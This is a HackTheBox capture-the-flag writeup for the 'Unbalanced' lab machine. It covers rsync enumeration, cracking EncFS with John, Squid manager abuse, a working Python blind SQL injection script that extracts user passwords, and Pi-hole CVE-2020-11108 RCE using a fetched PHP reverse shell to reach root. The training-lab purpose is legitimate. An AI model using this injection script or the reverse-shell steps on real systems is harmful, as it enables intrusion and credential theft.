---
image: /assets/avatars/unbalanced.png
title: Unbalanced Writeup
author: Valerio Casalino
style: fill
color: dark
tags: [Writeups, Hackthebox]
description: <img src="/assets/avatars/unbalanced.png"> Writeup for Unbalanced (Hackthebox)
---

# Unbalanced

As always, `nmap` it:

```bash
ports=$(sudo nmap -p- --min-rate=1000 -T4 10.10.10.200 | grep "^[0-9]" | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
mkdir nmap && sudo nmap -sC -sV -oN nma/assets/unbalanced -p $ports 10.10.10.200
...
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 a2:76:5c:b0:88:6f:9e:62:e8:83:51:e7:cf:bf:2d:f2 (RSA)
|   256 d0:65:fb:f6:3e:11:b1:d6:e6:f7:5e:c0:15:0c:0a:77 (ECDSA)
|_  256 5e:2b:93:59:1d:49:28:8d:43:2c:c1:f7:e3:37:0f:83 (ED25519)
873/tcp  open  rsync      (protocol version 31)
3128/tcp open  http-proxy Squid http proxy 4.6
|_http-server-header: squid/4.6
|_http-title: ERROR: The requested URL could not be retrieved
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
...
```

If we check port `873`, we can see the `rsync` daemon running, checking its content, we can find:

```bash
rsync -av rsync://10.10.10.200
conf_backups    EncFS-encrypted configuration backups
```

So, let's get that stuff in our working directory:

```bash
mkdir rsync-encrypted && rsync -uvrP rsync://10.10.10.200/conf_backups rsync-encrypted
```

This doesn't require authentication, but we have to crack the password of the [EncFS](https://wiki.archlinux.org/index.php/EncFS) file system using John the Ripper and its support scripts:

```bash
encfs2john rsync-encrypted > encfs-john.hash
john --wordlist=/usr/share/wordlists/passwords/rockyou.txt encfs-john.hash 2>/dev/null
```

![image-20201122174007082](/assets/unbalanced/image-20201122174007082.png)

Now we know the encryption password: `bubblegum`, so we can mount that file system using that password:

```bash
mkdir rsync-decrypted
encfs "$PWD/rsync-encrypted" "$PWD/rsync-decrypted"
# Insert password and we're ON
```

Reading `squid.conf` we can find useful information on port `3128`... [Squid](http://www.squid-cache.org/) is used as an HTTP proxy server requiring authentication to be used. This line gives us a new host:

![image-20201122174703962](/assets/unbalanced/image-20201122174703962.png)

Adding that virtual host to our hosts file, visiting that page we get a redirection by `index.php`:

![image-20201122211206917](/assets/unbalanced/image-20201122211206917.png)

Then, this page is in front of us:

![image-20201122211239642](/assets/unbalanced/image-20201122211239642.png)

Now, this other line gives us credentials to interact with `squid` remotely:

![image-20201122211335206](/assets/unbalanced/image-20201122211335206.png)

Now, what we need to do is fuzzing around with `squidclient`:

```bash
# This will show a list of stuff we can see (disabled or protected) with this client
squidclient -h 10.10.10.200 -w 'Thah$Sh1' mgr:menu
# The important thing is here
squidclient -h 10.10.10.200 -w 'Thah$Sh1' mgr:fqdncache
...
Address                                       Flg TTL Cnt Hostnames
127.0.1.1                                       H -001   2 unbalanced.htb unbalanced
::1                                             H -001   3 localhost ip6-localhost ip6-loopback
172.31.179.2                                    H -001   1 intranet-host2.unbalanced.htb
172.31.179.3                                    H -001   1 intranet-host3.unbalanced.htb
127.0.0.1                                       H -001   1 localhost
172.17.0.1                                      H -001   1 intranet.unbalanced.htb
ff02::1                                         H -001   1 ip6-allnodes
ff02::2                                         H -001   1 ip6-allrouters
...
```

Seems like `172.17.0.1` is a load balancer, so let's watch the hosts in which we are never redirected, after a while we get the right one (`172.31.179.1`). It is apparently the same, except for the fact that this is vulnerable to SQL injections:

![image-20201122211948673](/assets/unbalanced/image-20201122211948673.png)

Now we should exploit this SQLi to get some passwords! After some trial and errors, we can see that the best injection comes from querying the password substring to get a list of users with that password. This is done with this parameter in the password field:

```sql
' or substring(Password,{i},1)='{letter}
```

Putting it in a python script for all users:

```python
# Built in
import string
import re
import sys

# External
import requests

# Users retrieved with basic SQLi from http://172.31.179.1/intranet.php
users = [ 'rita', 'jim', 'bryan', 'sarah' ]
# List of credentials to print in the end!
final = []

print("Welcome!! it'll be done in moments", end ="")

for user in users:
    print(f"\n[*] Starting with {user}")
    stop = False
    password = ""
    i = 1
    while not stop:
        stop = True
        for letter in string.printable:
            # Endpoint
            url = "http://172.31.179.1/intranet.php"
            # POST data found with BURP
            data = {
                    "Username": "lolz", 
                    "Password": f"' or substring(Password,{i},1)='{letter}"
                    }
            # Proxy config for response module
            proxy = {"http": "http://10.10.10.200:3128"}
            # Initializing actual request
            res = requests.post(url, data=data, proxies=proxy)
            # If our user is found, then break the loop and look for another
            # letter incrementing the counter
            if re.search(user, res.text):
                # Look for the next letter
                stop = False
                i += 1
                # Update password
                password += letter
                # Rewrite line
                sys.stdout.write('\r')
                sys.stdout.flush()
                # Print line
                print(f"[+] {user}'s password: {password}", end="")
                break

```

 And the results are here!

![image-20201122223842975](/assets/unbalanced/image-20201122223842975.png)

Let's try to `ssh` in, and the only user who can is `bryan`. In `bryan`'s directory, we find the `TODO` file, which gives us info about what the user is working on. 

```
############
# Intranet #
############
* Install new intranet-host3 docker [DONE]
* Rewrite the intranet-host3 code to fix Xpath vulnerability [DONE]
* Test intranet-host3 [DONE]
* Add intranet-host3 to load balancer [DONE]
* Take down intranet-host1 and intranet-host2 from load balancer (set as quiescent, weight zero) [DONE]
* Fix intranet-host2 [DONE]
* Re-add intranet-host2 to load balancer (set default weight) [DONE]
- Fix intranet-host1 [TODO]
- Re-add intranet-host1 to load balancer (set default weight) [TODO]

###########
# Pi-hole #
###########
* Install Pi-hole docker (only listening on 127.0.0.1) [DONE]
* Set temporary admin password [DONE]
* Create Pi-hole configuration script [IN PROGRESS]
- Run Pi-hole configuration script [TODO]
- Expose Pi-hole ports to the network [TODO]
```

We learn that there is PI-Hole running in a Docker container, so let's discover where is the web interface.

![image-20201122233022143](/assets/unbalanced/image-20201122233022143.png)

Now we can go to the Pi-Hole admin page located at `http://172.31.11.3/admin/index.php`:

![image-20201122233125990](/assets/unbalanced/image-20201122233125990.png)

If you make a research using that particular software version you can find [this article](https://frichetten.com/blog/cve-2020-11108-pihole-rce/), which will guide us to RCE and privilege escalation. The credentials for the admin page are `admin:admin` by the way. Follow the instructions on the article to get this result:

![image-20201122234006765](/assets/unbalanced/image-20201122234006765.png)

Then, after `.domains`, paste some malicious PHP, in my case, I used this:

```bash
curl -sL "wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php" | xclip -sel c
```

This command should copy the php script in the clipboard, but in case it doesn't work, just visit the url. After that, visit `/admin/scripts/pi-hole/php/lolz.php` to trigger the shell. And here we have `www-data`:

![image-20201122235326489](/assets/unbalanced/image-20201122235326489.png)

Still following the article, now we should overwrite `teleport.php` and restart `pihole` triggering another shell as `root` (as the standard script of PI-Hole) launches the process as `root`:

![image-20201122235933785](/assets/unbalanced/image-20201122235933785.png)

And... now it is strange, because in the configuration script written by `root`, we find a password that can be used to login with (`su root`), but I expected something more.

![image-20201123000132518](/assets/unbalanced/image-20201123000132518.png)

Anyway... profit!
